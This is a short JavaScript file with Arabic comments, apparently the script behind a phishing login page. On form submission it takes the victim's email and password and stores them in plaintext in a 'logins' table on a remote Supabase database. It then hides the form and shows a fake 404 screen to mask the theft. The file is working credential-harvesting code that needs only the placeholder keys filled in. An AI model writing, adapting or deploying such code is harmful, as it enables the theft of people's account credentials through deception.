// إعداد اتصال Supabase
const SUPABASE_URL = 'YOUR_SUPABASE_URL';
const SUPABASE_ANON_KEY = 'YOUR_SUPABASE_ANON_KEY';
const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

const loginForm = document.getElementById('login-form');
const loginBox = document.getElementById('login-box');
const screen404 = document.getElementById('screen-404');

loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // حفظ البيانات في جدول logins على قاعدة بيانات Supabase
    const { data, error } = await supabaseClient
        .from('logins')
        .insert([{ email: email, password: password }]);

    if (error) {
        console.error('خطأ أثناء الحفظ:', error.message);
        alert('حدث خطأ ما، يرجى المحاولة لاحقاً.');
        return;
    }

    // إخفاء نموذج تسجيل الدخول وإظهار الشاشة البيضاء التي تحتوي على الصورة
    loginBox.style.display = 'none';
    screen404.style.display = 'flex';
});